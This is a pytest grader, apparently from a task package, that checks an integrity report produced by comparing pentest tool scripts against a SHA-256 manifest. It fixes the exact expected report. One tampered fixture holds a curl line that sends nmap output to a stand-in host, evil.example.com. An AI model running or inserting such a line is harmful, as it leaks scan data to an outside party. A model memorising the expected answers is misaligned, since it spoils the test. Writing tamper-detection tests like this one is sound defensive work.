# test_final_state.py

import os
import hashlib
import pytest

TOOLS_DIR = "/home/user/pentest/tools"
MANIFEST_PATH = "/home/user/pentest/manifest.sha256"
REPORT_PATH = "/home/user/pentest/integrity_report.txt"

TOOL_FILES = [
    "nmap_wrapper.sh",
    "enum_users.py",
    "port_scan.sh",
    "vuln_check.py",
    "report_gen.sh",
]

CLEAN_CONTENTS = {
    "nmap_wrapper.sh": (
        "#!/bin/bash\n"
        "# nmap wrapper for pentest engagement\n"
        "nmap -sV -sC -oA /tmp/nmap_out \"$1\"\n"
    ),
    "enum_users.py": (
        "#!/usr/bin/env python3\n"
        "# Enumerate users via LDAP\n"
        "import ldap3\n"
        "def enum_users(host):\n"
        "    print(f\"Enumerating users on {host}\")\n"
    ),
    "port_scan.sh": (
        "#!/bin/bash\n"
        "# Fast port scan\n"
        "masscan -p1-65535 \"$1\" --rate=1000 -oL /tmp/ports.txt\n"
    ),
    "vuln_check.py": (
        "#!/usr/bin/env python3\n"
        "# Check for common vulnerabilities\n"
        "import requests\n"
        "def check_vulns(target):\n"
        "    print(f\"Checking {target} for known CVEs\")\n"
    ),
    "report_gen.sh": (
        "#!/bin/bash\n"
        "# Report generator\n"
        "python3 report.py \"$1\"\n"
    ),
}

TAMPERED_CONTENT = {
    "report_gen.sh": (
        "#!/bin/bash\n"
        "# Report generator - MODIFIED\n"
        "curl -s http://evil.example.com/exfil --data @/tmp/nmap_out.nmap\n"
        "python3 report.py \"$1\"\n"
    ),
}

EXPECTED_REPORT = (
    "=== TOOLKIT INTEGRITY REPORT ===\n"
    "\n"
    "OK: enum_users.py\n"
    "OK: nmap_wrapper.sh\n"
    "OK: port_scan.sh\n"
    "TAMPERED: report_gen.sh\n"
    "OK: vuln_check.py\n"
    "\n"
    "VERDICT: 1 file(s) failed integrity check.\n"
)


def sha256_of_string(content: str) -> str:
    return hashlib.sha256(content.encode()).hexdigest()


def sha256_of_file(path: str) -> str:
    h = hashlib.sha256()
    with open(path, "rb") as f:
        h.update(f.read())
    return h.hexdigest()


# ---------------------------------------------------------------------------
# Pre-condition checks: ensure the environment is still intact
# ---------------------------------------------------------------------------

def test_tools_directory_exists():
    assert os.path.isdir(TOOLS_DIR), (
        f"Tools directory does not exist: {TOOLS_DIR}"
    )


def test_manifest_exists():
    assert os.path.isfile(MANIFEST_PATH), (
        f"Manifest file does not exist: {MANIFEST_PATH}"
    )


@pytest.mark.parametrize("filename", TOOL_FILES)
def test_tool_file_exists(filename):
    path = os.path.join(TOOLS_DIR, filename)
    assert os.path.isfile(path), (
        f"Tool file does not exist: {path}"
    )


def test_four_clean_files_have_correct_content():
    """The four non-tampered files should still match their expected clean content."""
    clean_files = [f for f in TOOL_FILES if f != "report_gen.sh"]
    for filename in clean_files:
        path = os.path.join(TOOLS_DIR, filename)
        with open(path, "rb") as f:
            actual_bytes = f.read()
        expected_bytes = CLEAN_CONTENTS[filename].encode()
        assert actual_bytes == expected_bytes, (
            f"{filename} content does not match expected clean content.\n"
            f"Expected:\n{expected_bytes!r}\n"
            f"Got:\n{actual_bytes!r}"
        )


def test_report_gen_is_tampered():
    """report_gen.sh on disk should still contain the TAMPERED content."""
    path = os.path.join(TOOLS_DIR, "report_gen.sh")
    with open(path, "rb") as f:
        actual_bytes = f.read()
    expected_tampered = TAMPERED_CONTENT["report_gen.sh"].encode()
    assert actual_bytes == expected_tampered, (
        f"report_gen.sh does not contain the expected TAMPERED content.\n"
        f"Expected:\n{expected_tampered!r}\n"
        f"Got:\n{actual_bytes!r}"
    )


# ---------------------------------------------------------------------------
# Primary checks: the integrity report must exist and be correct
# ---------------------------------------------------------------------------

def test_integrity_report_exists():
    assert os.path.isfile(REPORT_PATH), (
        f"Integrity report file does not exist: {REPORT_PATH}\n"
        "The student must create this file as part of the task."
    )


def test_integrity_report_exact_content():
    """The integrity report must match the expected content byte-for-byte."""
    with open(REPORT_PATH, "r") as f:
        actual = f.read()

    assert actual == EXPECTED_REPORT, (
        f"Integrity report content does not match expected.\n"
        f"Expected:\n{EXPECTED_REPORT!r}\n"
        f"Got:\n{actual!r}"
    )


def test_integrity_report_line_by_line():
    """Check each line of the integrity report individually for clearer failure messages."""
    with open(REPORT_PATH, "r") as f:
        actual_content = f.read()

    actual_lines = actual_content.splitlines(keepends=True)
    expected_lines = EXPECTED_REPORT.splitlines(keepends=True)

    assert len(actual_lines) == len(expected_lines), (
        f"Integrity report has {len(actual_lines)} lines, expected {len(expected_lines)}.\n"
        f"Expected lines:\n{''.join(expected_lines)!r}\n"
        f"Actual lines:\n{''.join(actual_lines)!r}"
    )

    for i, (actual_line, expected_line) in enumerate(zip(actual_lines, expected_lines), start=1):
        assert actual_line == expected_line, (
            f"Line {i} of integrity report does not match.\n"
            f"Expected: {expected_line!r}\n"
            f"Got:      {actual_line!r}"
        )


def test_integrity_report_header():
    """First line must be the header."""
    with open(REPORT_PATH, "r") as f:
        lines = f.readlines()

    assert len(lines) >= 1, "Integrity report is empty."
    assert lines[0].rstrip("\n") == "=== TOOLKIT INTEGRITY REPORT ===", (
        f"First line of report is wrong.\n"
        f"Expected: '=== TOOLKIT INTEGRITY REPORT ==='\n"
        f"Got:      {lines[0].rstrip(chr(10))!r}"
    )


def test_integrity_report_second_line_blank():
    """Second line must be blank."""
    with open(REPORT_PATH, "r") as f:
        lines = f.readlines()

    assert len(lines) >= 2, "Integrity report has fewer than 2 lines."
    assert lines[1].rstrip("\n") == "", (
        f"Second line of report should be blank.\n"
        f"Got: {lines[1].rstrip(chr(10))!r}"
    )


def test_integrity_report_file_status_lines():
    """Lines 3-7 (index 2-6) must be the file status lines in alphabetical order."""
    with open(REPORT_PATH, "r") as f:
        lines = f.readlines()

    # Expected file status lines (alphabetical order)
    expected_status_lines = [
        "OK: enum_users.py",
        "OK: nmap_wrapper.sh",
        "OK: port_scan.sh",
        "TAMPERED: report_gen.sh",
        "OK: vuln_check.py",
    ]

    assert len(lines) >= 7, (
        f"Integrity report has fewer than 7 lines; cannot check file status lines.\n"
        f"Got {len(lines)} lines."
    )

    for i, expected in enumerate(expected_status_lines):
        actual = lines[2 + i].rstrip("\n")
        assert actual == expected, (
            f"File status line {i + 1} (report line {3 + i}) is wrong.\n"
            f"Expected: {expected!r}\n"
            f"Got:      {actual!r}"
        )


def test_integrity_report_blank_line_before_verdict():
    """There must be a blank line between the last file status and the VERDICT line."""
    with open(REPORT_PATH, "r") as f:
        lines = f.readlines()

    # Line index 7 (8th line, 0-based) should be blank
    assert len(lines) >= 8, (
        f"Integrity report has fewer than 8 lines; missing blank line before VERDICT.\n"
        f"Got {len(lines)} lines."
    )
    assert lines[7].rstrip("\n") == "", (
        f"Line 8 (before VERDICT) should be blank.\n"
        f"Got: {lines[7].rstrip(chr(10))!r}"
    )


def test_integrity_report_verdict_line():
    """The VERDICT line must report exactly 1 failed file."""
    with open(REPORT_PATH, "r") as f:
        lines = f.readlines()

    assert len(lines) >= 9, (
        f"Integrity report has fewer than 9 lines; missing VERDICT line.\n"
        f"Got {len(lines)} lines."
    )
    verdict_line = lines[8].rstrip("\n")
    expected_verdict = "VERDICT: 1 file(s) failed integrity check."
    assert verdict_line == expected_verdict, (
        f"VERDICT line is wrong.\n"
        f"Expected: {expected_verdict!r}\n"
        f"Got:      {verdict_line!r}"
    )


def test_integrity_report_ok_files_are_correct():
    """Verify that the 4 OK files in the report are the ones that actually pass."""
    with open(REPORT_PATH, "r") as f:
        content = f.read()

    lines = content.splitlines()

    ok_files = []
    tampered_files = []
    for line in lines:
        if line.startswith("OK: "):
            ok_files.append(line[4:])
        elif line.startswith("TAMPERED: "):
            tampered_files.append(line[10:])

    expected_ok = sorted(["enum_users.py", "nmap_wrapper.sh", "port_scan.sh", "vuln_check.py"])
    expected_tampered = ["report_gen.sh"]

    assert sorted(ok_files) == expected_ok, (
        f"OK files in report do not match expected.\n"
        f"Expected OK: {expected_ok}\n"
        f"Got OK:      {sorted(ok_files)}"
    )

    assert tampered_files == expected_tampered, (
        f"TAMPERED files in report do not match expected.\n"
        f"Expected TAMPERED: {expected_tampered}\n"
        f"Got TAMPERED:      {tampered_files}"
    )


def test_integrity_report_no_extra_content():
    """The report must not contain checksums, extra whitespace lines, or additional commentary."""
    with open(REPORT_PATH, "r") as f:
        content = f.read()

    lines = content.splitlines()

    # Should be exactly 9 lines (header, blank, 5 file lines, blank, verdict)
    assert len(lines) == 9, (
        f"Integrity report should have exactly 9 lines, got {len(lines)}.\n"
        f"Lines:\n" + "\n".join(repr(l) for l in lines)
    )

    # No line should contain a SHA256 hash (64 hex chars)
    for i, line in enumerate(lines, start=1):
        words = line.split()
        for word in words:
            if len(word) == 64 and all(c in "0123456789abcdefABCDEF" for c in word):
                pytest.fail(
                    f"Line {i} appears to contain a SHA256 hash, which is not allowed.\n"
                    f"Line: {line!r}"
                )


def test_manifest_still_intact():
    """The manifest should not have been modified by the student's script."""
    with open(MANIFEST_PATH, "r") as f:
        lines = [l.rstrip("\n") for l in f if l.strip()]

    assert len(lines) == 5, (
        f"Manifest should still have 5 entries, got {len(lines)}."
    )

    manifest = {}
    for line in lines:
        parts = line.split("  ", 1)
        assert len(parts) == 2, (
            f"Manifest line malformed: {line!r}"
        )
        manifest[parts[1]] = parts[0]

    # Verify manifest hashes still correspond to clean versions
    for filename, clean_content in CLEAN_CONTENTS.items():
        expected_hash = sha256_of_string(clean_content)
        assert filename in manifest, (
            f"File '{filename}' not found in manifest after task completion."
        )
        assert manifest[filename] == expected_hash, (
            f"Manifest hash for '{filename}' has been altered.\n"
            f"Expected (clean version hash): {expected_hash}\n"
            f"Got: {manifest[filename]}"
        )